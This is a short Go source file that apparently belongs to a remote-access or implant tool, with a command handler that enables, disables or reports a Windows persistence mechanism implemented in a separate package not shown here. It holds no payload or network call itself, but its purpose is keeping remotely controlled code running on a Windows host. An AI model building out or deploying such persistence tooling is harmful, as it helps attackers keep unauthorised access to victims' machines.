package persistence

import (
	"nombredetuapp/Documents/Proyecto/src/commands/persistence/windows"
	"strconv"
)

var (
	PersistenceEnabled  = false
	PersistenceStrategy = "none"
	message             = ""
)

func PersistenceCommand(args []string) string {
	if len(args) < 1 {
		return "Usage: persistence <enable|disable|status> [strategy]\n"
	}
	action := args[0]
	switch action {
	case "enable":
		PersistenceEnabled, PersistenceStrategy, message = (&windows.WindowsPersistence{}).Enable(args[1:])
		return message
	case "disable":
		PersistenceEnabled, message = (&windows.WindowsPersistence{}).Disable(PersistenceStrategy)
		return message
	case "status":
		return "Persistence Enabled: " + strconv.FormatBool(PersistenceEnabled) + "\n Strategy: " + PersistenceStrategy + "\n"
	default:
		return "Unknown action. Use 'enable', 'disable', or 'status'.\n"
	}

	return "Persistence command executed.\n"
}
